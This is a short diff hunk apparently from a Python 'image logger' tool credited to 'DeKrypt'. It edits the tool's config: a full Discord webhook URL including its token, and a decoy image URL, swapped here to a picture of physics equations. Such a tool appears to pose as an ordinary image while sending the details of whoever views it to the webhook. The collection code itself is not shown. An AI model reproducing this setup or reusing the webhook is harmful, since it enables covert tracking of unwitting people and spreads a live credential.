@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1343664856728993813/jc35HT83zpa3xgHixC1Bh0GXA6rlqzqRZrmqmG4vj44eOGzDC5D8z3wsp4lPA9vj8aPP",
-    "image": "https://cdn.discordapp.com/attachments/1340130239044386930/1343665253145251982/Eggluze.jpeg?ex=67be1948&is=67bcc7c8&hm=15cec7727f3d9a831749fe7ed816b25436efdcd86fdf83bcd9e386d5d693db45&", # You can also have a custom image by using a URL argument
+    "image": "https://praxilabs.com/en/blog/wp-content/uploads/2019/05/the-Most-Important-Physics-Equations-in-History.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
